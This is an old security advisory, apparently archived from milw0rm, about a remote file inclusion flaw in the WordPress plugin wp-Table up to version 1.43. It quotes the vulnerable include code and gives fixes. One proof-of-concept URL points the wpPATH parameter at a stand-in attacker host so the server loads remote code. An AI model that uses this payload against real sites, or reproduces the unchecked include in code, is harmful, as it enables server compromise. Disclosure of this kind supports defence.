@@ -1,0 +1,93 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_82$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_82$2007] wordpress plugins wp-Table <= 1.43 (inc_dir) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : May, 1 st 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv82-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : wp-Table  
+version       : <= 1.43
+Vendor        : http://alexrabe.boelinger.com/?page_id=3
+Description :
+
+This plugin is a simple table manager for wordpress.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+- Invalid include function at js/wptable-button.php :  
+  	
+----------------js/wptable-button.phpp-------------------
+...
+if (!$_POST) $wppath=$_GET['wpPATH'];
+else $wppath=$_POST['wpPATH'];
+
+require_once($wppath.'/wp-config.php');
+require_once($wppath.'/wp-admin/admin.php');
+
+global $wpdb;
+...
+----------------------------------------------------------------
+
+
+Input passed to the "wpPATH" parameter in js/wptable-button.php is not properly verified before being used to include files. 
+This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/wp-content/plugins/wp-table/js/wptable-button.phpp?wpPATH=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals
+- use the latest version 
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-05-01]
